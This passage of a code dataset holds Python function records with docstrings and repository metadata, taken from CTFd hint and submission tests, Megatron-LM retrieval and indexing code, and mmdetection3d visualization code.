r.status_code == 403\n\n        user = Users.query.filter_by(id=2).first()\n\n        assert user.score == 100\n        assert Unlocks.query.count() == 0\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that hints for challenges with unicode names can be unlocked\"\"\"\n", "func_signal": "def test_unlocking_hint_for_unicode_challenge():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    register_user(app)\n    chal = gen_challenge(app.db, name=text_type(\"\ud83d\udc3a\"))\n    chal_id = chal.id\n    gen_hint(app.db, chal_id)\n\n    client = login_as_user(app)\n\n    r = client.get(\"/api/v1/hints/1\")\n    assert r.status_code == 200\n    resp = r.get_json()[\"data\"]\n    assert resp.get(\"content\") == \"This is a hint\"\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"\nThis method is in used to access the data of a challenge in a format processable by the front end.\n\n:param challenge:\n:return: Challenge object, data dictionary to be returned to the user\n\"\"\"\n", "func_signal": "def read(cls, challenge):\n", "code": "challenge = DynamicChallenge.query.filter_by(id=challenge.id).first()\ndata = {\n    \"id\": challenge.id,\n    \"name\": challenge.name,\n    \"value\": challenge.value,\n    \"initial\": challenge.initial,\n    \"decay\": challenge.decay,\n    \"minimum\": challenge.minimum,\n    \"description\": challenge.description,\n    \"category\": challenge.category,\n    \"state\": challenge.state,\n    \"max_attempts\": challenge.max_attempts,\n    \"type\": challenge.type,\n    \"type_data\": {\n        \"id\": cls.id,\n        \"name\": cls.name,\n        \"templates\": cls.templates,\n        \"scripts\": cls.scripts,\n    },\n}\nreturn data", "path": "CTFd/CTFd/plugins/dynamic_challenges/__init__.py", "commit_date": "2020-07-01 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Can a user get /api/v1/submissions if admin\"\"\"\n", "func_signal": "def test_api_submissions_get_admin():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    with login_as_user(app, \"admin\") as client:\n        r = client.get(\"/api/v1/submissions\", json=\"\")\n        assert r.status_code == 200\n        r = client.get(\"/api/v1/submissions?user_id=1\", json=\"\")\n        assert r.status_code == 200\ndestroy_ctfd(app)", "path": "CTFd/tests/api/v1/test_submissions.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that hints with a cost are not unlocked if you don't have the points\"\"\"\n", "func_signal": "def test_unlocking_hints_with_cost_during_ctf_without_points():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    register_user(app)\n    chal = gen_challenge(app.db)\n    chal_id = chal.id\n    gen_hint(app.db, chal_id, cost=10)\n\n    client = login_as_user(app)\n\n    r = client.get(\"/api/v1/hints/1\")\n    assert r.get_json()[\"data\"].get(\"content\") is None\n\n    r = client.post(\"/api/v1/unlocks\", json={\"target\": 1, \"type\": \"hints\"})\n    assert (\n        r.get_json()[\"errors\"][\"score\"]\n        == \"You do not have enough points to unlock this hint\"\n    )\n\n    r = client.get(\"/api/v1/hints/1\")\n    assert r.get_json()[\"data\"].get(\"content\") is None\n\n    user = Users.query.filter_by(id=2).first()\n    assert user.score == 0\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Can a user get /api/v1/submissions/<submission_id> if admin\"\"\"\n", "func_signal": "def test_api_submission_get_admin():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    gen_solve(app.db, user_id=1)\n    with login_as_user(app, \"admin\") as client:\n        r = client.get(\"/api/v1/submissions/1\", json=\"\")\n        assert r.status_code == 200\ndestroy_ctfd(app)", "path": "CTFd/tests/api/v1/test_submissions.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"\nThis method is used to update the information associated with a challenge. This should be kept strictly to the\nChallenges table and any child tables.\n\n:param challenge:\n:param request:\n:return:\n\"\"\"\n", "func_signal": "def update(cls, challenge, request):\n", "code": "data = request.form or request.get_json()\n\nfor attr, value in data.items():\n    # We need to set these to floats so that the next operations don't operate on strings\n    if attr in (\"initial\", \"minimum\", \"decay\"):\n        value = float(value)\n    setattr(challenge, attr, value)\n\nreturn DynamicValueChallenge.calculate_value(challenge)", "path": "CTFd/CTFd/plugins/dynamic_challenges/__init__.py", "commit_date": "2020-07-01 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that hints with no cost can be unlocked\"\"\"\n", "func_signal": "def test_unlocking_hints_with_no_cost():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    register_user(app)\n    chal = gen_challenge(app.db)\n    chal_id = chal.id\n    gen_hint(app.db, chal_id)\n    client = login_as_user(app)\n    r = client.get(\"/api/v1/hints/1\")\n    resp = r.get_json()[\"data\"]\n    assert resp.get(\"content\") == \"This is a hint\"\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that hints with a cost are not unlocked if the CTF has ended\"\"\"\n", "func_signal": "def test_unlocking_hints_with_cost_during_ended_ctf():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    register_user(app)\n    chal = gen_challenge(app.db)\n    chal_id = chal.id\n    gen_hint(app.db, chal_id, cost=10)\n    gen_award(app.db, user_id=2)\n\n    set_config(\n        \"start\", \"1507089600\"\n    )  # Wednesday, October 4, 2017 12:00:00 AM GMT-04:00 DST\n    set_config(\n        \"end\", \"1507262400\"\n    )  # Friday, October 6, 2017 12:00:00 AM GMT-04:00 DST\n\n    with freeze_time(\"2017-11-4\"):\n        client = login_as_user(app)\n\n        r = client.get(\"/api/v1/hints/1\")\n        assert r.get_json().get(\"data\") is None\n        assert r.status_code == 403\n\n        r = client.post(\"/api/v1/unlocks\", json={\"target\": 1, \"type\": \"hints\"})\n        assert r.status_code == 403\n        assert r.get_json()\n\n        r = client.get(\"/api/v1/hints/1\")\n        assert r.status_code == 403\n\n        user = Users.query.filter_by(id=2).first()\n        assert user.score == 100\n        assert Unlocks.query.count() == 0\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that hints with a cost are unlocked if you have the points\"\"\"\n", "func_signal": "def test_unlocking_hints_with_cost_during_ctf_with_points():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    register_user(app)\n    chal = gen_challenge(app.db)\n    chal_id = chal.id\n    gen_hint(app.db, chal_id, cost=10)\n    gen_award(app.db, user_id=2)\n\n    client = login_as_user(app)\n    r = client.get(\"/api/v1/hints/1\")\n    assert r.get_json()[\"data\"].get(\"content\") is None\n\n    client.post(\"/api/v1/unlocks\", json={\"target\": 1, \"type\": \"hints\"})\n\n    r = client.get(\"/api/v1/hints/1\")\n    assert r.get_json()[\"data\"].get(\"content\") == \"This is a hint\"\n\n    user = Users.query.filter_by(id=2).first()\n    assert user.score == 90\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that a user can unlock a hint if they have enough points\"\"\"\n", "func_signal": "def test_user_can_unlock_hint():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    with app.test_client():\n        register_user(app, name=\"user1\", email=\"user1@ctfd.io\")\n\n        chal = gen_challenge(app.db, value=100)\n        chal_id = chal.id\n\n        gen_flag(app.db, challenge_id=chal.id, content=\"flag\")\n\n        hint = gen_hint(app.db, chal_id, cost=10)\n        hint_id = hint.id\n\n        gen_award(app.db, user_id=2, value=15)\n\n        client = login_as_user(app, name=\"user1\", password=\"password\")\n\n        user = Users.query.filter_by(name=\"user1\").first()\n        assert user.score == 15\n\n        with client.session_transaction():\n            r = client.get(\"/api/v1/hints/{}\".format(hint_id))\n            resp = r.get_json()\n            assert resp[\"data\"].get(\"content\") is None\n\n            params = {\"target\": hint_id, \"type\": \"hints\"}\n\n            r = client.post(\"/api/v1/unlocks\", json=params)\n            resp = r.get_json()\n            assert resp[\"success\"] is True\n\n            r = client.get(\"/api/v1/hints/{}\".format(hint_id))\n            resp = r.get_json()\n            assert resp[\"data\"].get(\"content\") == \"This is a hint\"\n\n            user = Users.query.filter_by(name=\"user1\").first()\n            assert user.score == 5\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Test that hints with a cost are unlocked if the CTF is frozen.\"\"\"\n", "func_signal": "def test_unlocking_hints_with_cost_during_frozen_ctf():\n", "code": "app = create_ctfd()\nwith app.app_context():\n    set_config(\n        \"freeze\", \"1507262400\"\n    )  # Friday, October 6, 2017 12:00:00 AM GMT-04:00 DST\n    with freeze_time(\"2017-10-4\"):\n        register_user(app)\n        chal = gen_challenge(app.db)\n        chal_id = chal.id\n        gen_hint(app.db, chal_id, cost=10)\n        gen_award(app.db, user_id=2)\n\n    with freeze_time(\"2017-10-8\"):\n        client = login_as_user(app)\n\n        client.get(\"/api/v1/hints/1\")\n\n        client.post(\"/api/v1/unlocks\", json={\"target\": 1, \"type\": \"hints\"})\n\n        r = client.get(\"/api/v1/hints/1\")\n\n        resp = r.get_json()[\"data\"]\n        assert resp.get(\"content\") == \"This is a hint\"\n\n        user = Users.query.filter_by(id=2).first()\n        assert user.score == 100\ndestroy_ctfd(app)", "path": "CTFd/tests/users/test_hints.py", "commit_date": "2020-02-17 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"\nFunction that safely formats strings with arbitrary potentially user-supplied format strings\nLooks for interpolation placeholders like {target} or {{ target }}\n\"\"\"\n", "func_signal": "def safe_format(fmt, **kwargs):\n", "code": "return re.sub(\n    r\"\\{?\\{([^{}]*)\\}\\}?\", lambda m: kwargs.get(m.group(1).strip(), m.group(0)), fmt\n)", "path": "CTFd/CTFd/utils/formatters/__init__.py", "commit_date": "2019-12-23 00:00:00", "repo_name": "CTFd/CTFd", "stars": 5213, "license": "apache-2.0", "language": "python", "size": 39768}
{"docstring": "\"\"\"Embed a batch of tokens using the block model\"\"\"\n", "func_signal": "def embed_block(self, block_tokens, block_attention_mask):\n", "code": "if self.use_block_model:\n    block_types = torch.cuda.LongTensor(*block_tokens.shape).fill_(0)\n    block_ict_logits, _ = self.block_model.forward(block_tokens, block_attention_mask, block_types)\n    return block_ict_logits\nelse:\n    raise ValueError(\"Cannot embed block without block model.\")", "path": "Megatron-LM/megatron/model/realm_model.py", "commit_date": "2020-12-27 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Get a dataset which uses block samples mappings to get ICT/block indexing data (via get_block())\nrather than for training, since it is only built with a single epoch sample mapping.\n\"\"\"\n", "func_signal": "def get_ict_dataset(use_titles=True, query_in_block_prob=1):\n", "code": "args = get_args()\nblock_dataset = get_indexed_dataset_(args.data_path, 'mmap', True)\ntitles_dataset = get_indexed_dataset_(args.titles_data_path, 'mmap', True)\n\nkwargs = dict(\n    name='full',\n    block_dataset=block_dataset,\n    title_dataset=titles_dataset,\n    data_prefix=args.data_path,\n    num_epochs=1,\n    max_num_samples=None,\n    max_seq_length=args.seq_length,\n    seed=1,\n    query_in_block_prob=query_in_block_prob,\n    use_titles=use_titles,\n    use_one_sent_docs=args.use_one_sent_docs\n)\ndataset = ICTDataset(**kwargs)\nreturn dataset", "path": "Megatron-LM/megatron/data/ict_dataset.py", "commit_date": "2020-07-23 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Get the top-k blocks by the index distance metric.\n\n:param reconstruct: if True: return a [num_queries x k x embed_dim] array of blocks\n                    if False: return [num_queries x k] array of distances, and another for indices\n\"\"\"\n", "func_signal": "def search_mips_index(self, query_embeds, top_k, reconstruct=True):\n", "code": "query_embeds = np.float32(detach(query_embeds))\n\nif reconstruct:\n    # get the vectors themselves\n    top_k_block_embeds = self.block_mips_index.search_and_reconstruct(query_embeds, top_k)\n    return top_k_block_embeds\n\nelse:\n    # get distances and indices of closest vectors\n    distances, block_indices = self.block_mips_index.search(query_embeds, top_k)\n    if self.use_gpu:\n        fresh_indices = np.zeros(block_indices.shape)\n        for i, j in itertools.product(block_indices.shape):\n            fresh_indices[i, j] = self.id_map[block_indices[i, j]]\n        block_indices = fresh_indices\n    return distances, block_indices", "path": "Megatron-LM/megatron/data/realm_index.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Populate members from instance saved to file\"\"\"\n\n", "func_signal": "def load_from_file(self):\n", "code": "if mpu.is_unitialized() or mpu.get_data_parallel_rank() == 0:\n    print(\"\\n> Unpickling BlockData\", flush=True)\nstate_dict = pickle.load(open(self.block_data_path, 'rb'))\nif mpu.is_unitialized() or mpu.get_data_parallel_rank() == 0:\n    print(\">> Finished unpickling BlockData\\n\", flush=True)\n\nself.embed_data = state_dict['embed_data']\nself.meta_data = state_dict['meta_data']", "path": "Megatron-LM/megatron/data/realm_index.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Add data for set of blocks\n:param block_indices: 1D array of unique int ids for the blocks\n:param block_embeds: 2D array of embeddings of the blocks\n:param block_metas: 2D array of metadata for the blocks.\n    In the case of REALM this will be [start_idx, end_idx, doc_idx]\n\"\"\"\n", "func_signal": "def add_block_data(self, block_indices, block_embeds, block_metas, allow_overwrite=False):\n", "code": "for idx, embed, meta in zip(block_indices, block_embeds, block_metas):\n    if not allow_overwrite and idx in self.embed_data:\n        raise ValueError(\"Unexpectedly tried to overwrite block data\")\n\n    self.embed_data[idx] = np.float16(embed)\n    self.meta_data[idx] = meta", "path": "Megatron-LM/megatron/data/realm_index.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Save dict with state dicts of each of the models.\"\"\"\n", "func_signal": "def state_dict_for_save_checkpoint(self, destination=None, prefix='', keep_vars=False):\n", "code": "state_dict_ = {}\nif self.use_query_model:\n    state_dict_[self._query_key] \\\n        = self.query_model.state_dict_for_save_checkpoint(\n        destination, prefix, keep_vars)\n\nif self.use_block_model:\n    state_dict_[self._block_key] \\\n        = self.block_model.state_dict_for_save_checkpoint(\n        destination, prefix, keep_vars)\n\nreturn state_dict_", "path": "Megatron-LM/megatron/model/realm_model.py", "commit_date": "2020-12-27 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Get an ICT example of a pseudo-query and the block of text from which it was extracted\"\"\"\n", "func_signal": "def __getitem__(self, idx):\n", "code": "sample_data = self.samples_mapping[idx]\nstart_idx, end_idx, doc_idx, block_idx = sample_data.as_tuple()\n\nif self.use_titles:\n    title = self.title_dataset[int(doc_idx)]\n    title_pad_offset = 3 + len(title)\nelse:\n    title = None\n    title_pad_offset = 2\nblock = [self.block_dataset[i] for i in range(start_idx, end_idx)]\nassert len(block) > 1 or self.use_one_sent_docs or self.query_in_block_prob == 1\n\n# randint() is inclusive for Python rng\nrand_sent_idx = self.rng.randint(0, len(block) - 1)\n\n# keep the query in the context query_in_block_prob fraction of the time.\nif self.rng.random() < self.query_in_block_prob:\n    query = block[rand_sent_idx].copy()\nelse:\n    query = block.pop(rand_sent_idx)\n\n# still need to truncate because blocks are concluded when\n# the sentence lengths have exceeded max_seq_length.\nquery = query[:self.max_seq_length - 2]\nblock = list(itertools.chain(*block))[:self.max_seq_length - title_pad_offset]\n\nquery_tokens, query_pad_mask = self.concat_and_pad_tokens(query)\nblock_tokens, block_pad_mask = self.concat_and_pad_tokens(block, title)\nblock_data = sample_data.as_array()\n\nsample = {\n    'query_tokens': query_tokens,\n    'query_pad_mask': query_pad_mask,\n    'block_tokens': block_tokens,\n    'block_pad_mask': block_pad_mask,\n    'block_data': block_data,\n}\n\nreturn sample", "path": "Megatron-LM/megatron/data/ict_dataset.py", "commit_date": "2020-07-23 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Get the IDs for an evidence block plus the title of the corresponding document\"\"\"\n", "func_signal": "def get_block(self, start_idx, end_idx, doc_idx):\n", "code": "block = [self.block_dataset[i] for i in range(start_idx, end_idx)]\ntitle = self.title_dataset[int(doc_idx)]\n\nblock = list(itertools.chain(*block))[:self.max_seq_length - (3 + len(title))]\nblock_tokens, block_pad_mask = self.concat_and_pad_tokens(block, title)\n\nreturn block_tokens, block_pad_mask", "path": "Megatron-LM/megatron/data/ict_dataset.py", "commit_date": "2020-07-23 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Build the model.\"\"\"\n", "func_signal": "def general_ict_model_provider(only_query_model=False, only_block_model=False):\n", "code": "args = get_args()\nassert args.ict_head_size is not None, \\\n    \"Need to specify --ict-head-size to provide an ICTBertModel\"\nassert mpu.get_tensor_model_parallel_world_size() == 1 and mpu.get_pipeline_model_parallel_world_size() == 1, \\\n    \"Model parallel size > 1 not supported for ICT\"\n\nprint_rank_0('building ICTBertModel...')\n\n# simpler to just keep using 2 tokentypes since the LM we initialize with has 2 tokentypes\nmodel = ICTBertModel(\n    ict_head_size=args.ict_head_size,\n    num_tokentypes=2,\n    parallel_output=True,\n    only_query_model=only_query_model,\n    only_block_model=only_block_model)\n\nreturn model", "path": "Megatron-LM/megatron/model/realm_model.py", "commit_date": "2020-12-27 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Get empty block and title - used in REALM pretraining\"\"\"\n", "func_signal": "def get_null_block(self):\n", "code": "block, title = [], []\nblock_tokens, block_pad_mask = self.concat_and_pad_tokens(block, title)\n\nreturn block_tokens, block_pad_mask", "path": "Megatron-LM/megatron/data/ict_dataset.py", "commit_date": "2020-07-23 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Embed a batch of tokens using the query model\"\"\"\n", "func_signal": "def embed_query(self, query_tokens, query_attention_mask):\n", "code": "if self.use_query_model:\n    query_types = torch.cuda.LongTensor(*query_tokens.shape).fill_(0)\n    query_ict_logits, _ = self.query_model.forward(query_tokens, query_attention_mask, query_types)\n    return query_ict_logits\nelse:\n    raise ValueError(\"Cannot embed query without query model.\")", "path": "Megatron-LM/megatron/model/realm_model.py", "commit_date": "2020-12-27 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Run a forward pass for each of the models and return the respective embeddings.\"\"\"\n", "func_signal": "def forward(self, query_tokens, query_attention_mask, block_tokens, block_attention_mask):\n", "code": "query_logits = self.embed_query(query_tokens, query_attention_mask)\nblock_logits = self.embed_block(block_tokens, block_attention_mask)\nreturn query_logits, block_logits", "path": "Megatron-LM/megatron/model/realm_model.py", "commit_date": "2020-12-27 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Create a Faiss Flat index with inner product as the metric to search against\"\"\"\n", "func_signal": "def _set_block_index(self):\n", "code": "try:\n    import faiss\nexcept ImportError:\n    raise Exception(\"Error: Please install faiss to use FaissMIPSIndex\")\n\nif mpu.is_unitialized() or mpu.get_data_parallel_rank() == 0:\n    print(\"\\n> Building index\", flush=True)\nself.block_mips_index = faiss.index_factory(self.embed_size, 'Flat', faiss.METRIC_INNER_PRODUCT)\n\nif self.use_gpu:\n    # create resources and config for GpuIndex\n    res = faiss.StandardGpuResources()\n    config = faiss.GpuIndexFlatConfig()\n    config.device = torch.cuda.current_device()\n    config.useFloat16 = True\n\n    self.block_mips_index = faiss.GpuIndexFlat(res, self.block_mips_index, config)\n    if mpu.is_unitialized() or mpu.get_data_parallel_rank() == 0:\n        print(\">> Initialized index on GPU {}\".format(self.block_mips_index.getDevice()), flush=True)\nelse:\n    # CPU index supports IDs so wrap with IDMap\n    self.block_mips_index = faiss.IndexIDMap(self.block_mips_index)\n    if mpu.is_unitialized() or mpu.get_data_parallel_rank() == 0:\n        print(\">> Initialized index on CPU\", flush=True)\n\n# if we were constructed with a BlockData, then automatically load it when the FAISS structure is built\nif self.block_data is not None:\n    self.add_block_embed_data(self.block_data)", "path": "Megatron-LM/megatron/data/realm_index.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Concat with special tokens and pad sequence to self.max_seq_length\"\"\"\n", "func_signal": "def concat_and_pad_tokens(self, tokens, title=None):\n", "code": "tokens = list(tokens)\nif title is None:\n    tokens = [self.cls_id] + tokens + [self.sep_id]\nelse:\n    title = list(title)\n    tokens = [self.cls_id] + title + [self.sep_id] + tokens + [self.sep_id]\nassert len(tokens) <= self.max_seq_length\n\nnum_pad = self.max_seq_length - len(tokens)\npad_mask = [1] * len(tokens) + [0] * num_pad\ntokens += [self.pad_id] * num_pad\n\nreturn np.array(tokens), np.array(pad_mask)", "path": "Megatron-LM/megatron/data/ict_dataset.py", "commit_date": "2020-07-23 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Delete existing index and create anew\"\"\"\n", "func_signal": "def reset_index(self):\n", "code": "del self.block_mips_index\n\n# reset the block data so that _set_block_index will reload it as well\nif self.block_data is not None:\n    block_data_path = self.block_data.block_data_path\n    del self.block_data\n    self.block_data = BlockData(block_data_path)\n\nself._set_block_index()", "path": "Megatron-LM/megatron/data/realm_index.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Load the state dicts of each of the models\"\"\"\n", "func_signal": "def load_state_dict(self, state_dict, strict=True):\n", "code": "if self.use_query_model:\n    print(\"Loading ICT query model\", flush=True)\n    self.query_model.load_state_dict(\n        state_dict[self._query_key], strict=strict)\n\nif self.use_block_model:\n    print(\"Loading ICT block model\", flush=True)\n    self.block_model.load_state_dict(\n        state_dict[self._block_key], strict=strict)", "path": "Megatron-LM/megatron/model/realm_model.py", "commit_date": "2020-12-27 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "# Use Encoder class as a container for global data\n", "func_signal": "def initializer(self):\n", "code": "Encoder.tokenizer = build_tokenizer(self.args)\nif self.args.split_sentences:\n    if not nltk_available:\n        print(\"NLTK is not available to split sentences.\")\n        exit()\n    splitter = nltk.load(\"tokenizers/punkt/english.pickle\")\n    if self.args.keep_newlines:\n        # this prevents punkt from eating newlines after sentences\n        Encoder.splitter = nltk.tokenize.punkt.PunktSentenceTokenizer(\n            train_text = splitter._params,\n            lang_vars = CustomLanguageVars())\n    else:\n        Encoder.splitter = splitter\n\nelse:\n    Encoder.splitter = IdentitySplitter()", "path": "Megatron-LM/tools/preprocess_data.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Provide extra arguments required for tasks.\"\"\"\n", "func_signal": "def get_tasks_args(parser):\n", "code": "group = parser.add_argument_group(title='tasks')\n\ngroup.add_argument('--task', type=str, required=True,\n                   help='Task name.')\ngroup.add_argument('--epochs', type=int, default=None,\n                   help='Number of finetunning epochs. Zero results in '\n                   'evaluation only.')\ngroup.add_argument('--pretrained-checkpoint', type=str, default=None,\n                   help='Pretrained checkpoint used for finetunning.')\ngroup.add_argument('--keep-last', action='store_true',\n                   help='Keep the last batch (maybe incomplete) in'\n                   'the data loader')\ngroup.add_argument('--train-data', nargs='+', default=None,\n                   help='Whitespace separated paths or corpora names '\n                   'for training.')\ngroup.add_argument('--valid-data', nargs='*', default=None,\n                   help='path(s) to the validation data.')\ngroup.add_argument('--overlapping-eval', type=int, default=32,\n                   help='Sliding window for overlapping evaluation.')\ngroup.add_argument('--strict-lambada', action='store_true',\n                   help='Use more difficult formulation of lambada.')\n\nreturn parser", "path": "Megatron-LM/tasks/main.py", "commit_date": "2020-04-16 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Add the embedding of each block to the underlying FAISS index\"\"\"\n\n# this assumes the embed_data is a dict : {int: np.array<float>}\n", "func_signal": "def add_block_embed_data(self, all_block_data):\n", "code": "block_indices, block_embeds = zip(*all_block_data.embed_data.items())\n\n# the embeddings have to be entered in as float32 even though the math internally is done with float16.\nblock_embeds_arr = np.float32(np.array(block_embeds))\nblock_indices_arr = np.array(block_indices)\n\n# faiss GpuIndex doesn't work with IDMap wrapper so store ids to map back with\nif self.use_gpu:\n    for i, idx in enumerate(block_indices):\n        self.id_map[i] = idx\n\n# we no longer need the embedding data since it's in the index now\nall_block_data.clear()\n\nif self.use_gpu:\n    self.block_mips_index.add(block_embeds_arr)\nelse:\n    self.block_mips_index.add_with_ids(block_embeds_arr, block_indices_arr)\n\nif mpu.is_unitialized() or mpu.get_data_parallel_rank() == 0:\n    print(\">>> Finished adding block data to index\", flush=True)", "path": "Megatron-LM/megatron/data/realm_index.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"Save the block data that was created this in this process\"\"\"\n", "func_signal": "def save_shard(self):\n", "code": "if not os.path.isdir(self.temp_dir_name):\n    os.makedirs(self.temp_dir_name, exist_ok=True)\n\n# save the data for each shard\nwith open('{}/{}.pkl'.format(self.temp_dir_name, self.rank), 'wb') as data_file:\n    pickle.dump(self.state(), data_file)", "path": "Megatron-LM/megatron/data/realm_index.py", "commit_date": "2020-07-26 00:00:00", "repo_name": "NVIDIA/Megatron-LM", "stars": 7999, "license": "other", "language": "python", "size": 6912}
{"docstring": "\"\"\"bool: Whether the detector has a 2D image box head.\"\"\"\n", "func_signal": "def with_img_bbox(self):\n", "code": "return hasattr(self,\n               'img_bbox_head') and self.img_bbox_head is not None", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Results visualization.\n\nArgs:\n    data (dict): Input points and the information of the sample.\n    result (dict): Prediction results.\n    out_dir (str): Output directory of visualization result.\n\"\"\"\n", "func_signal": "def show_results(self, data, result, out_dir):\n", "code": "for batch_id in range(len(result)):\n    if isinstance(data['points'][0], DC):\n        points = data['points'][0]._data[0][batch_id].numpy()\n    elif mmcv.is_list_of(data['points'][0], torch.Tensor):\n        points = data['points'][0][batch_id]\n    else:\n        ValueError(f\"Unsupported data type {type(data['points'][0])} \"\n                   f'for visualization!')\n    if isinstance(data['img_metas'][0], DC):\n        pts_filename = data['img_metas'][0]._data[0][batch_id][\n            'pts_filename']\n        box_mode_3d = data['img_metas'][0]._data[0][batch_id][\n            'box_mode_3d']\n    elif mmcv.is_list_of(data['img_metas'][0], dict):\n        pts_filename = data['img_metas'][0][batch_id]['pts_filename']\n        box_mode_3d = data['img_metas'][0][batch_id]['box_mode_3d']\n    else:\n        ValueError(\n            f\"Unsupported data type {type(data['img_metas'][0])} \"\n            f'for visualization!')\n    file_name = osp.split(pts_filename)[-1].split('.')[0]\n\n    assert out_dir is not None, 'Expect out_dir, got none.'\n    inds = result[batch_id]['pts_bbox']['scores_3d'] > 0.1\n    pred_bboxes = copy.deepcopy(\n        result[batch_id]['pts_bbox']['boxes_3d'][inds].tensor.numpy())\n    # for now we convert points into depth mode\n    if box_mode_3d == Box3DMode.DEPTH:\n        pred_bboxes[..., 2] += pred_bboxes[..., 5] / 2\n    elif (box_mode_3d == Box3DMode.CAM) or (box_mode_3d\n                                            == Box3DMode.LIDAR):\n        points = points[..., [1, 0, 2]]\n        points[..., 0] *= -1\n        pred_bboxes = Box3DMode.convert(pred_bboxes, box_mode_3d,\n                                        Box3DMode.DEPTH)\n        pred_bboxes[..., 2] += pred_bboxes[..., 5] / 2\n    else:\n        ValueError(\n            f'Unsupported box_mode_3d {box_mode_3d} for convertion!')\n    show_result(points, 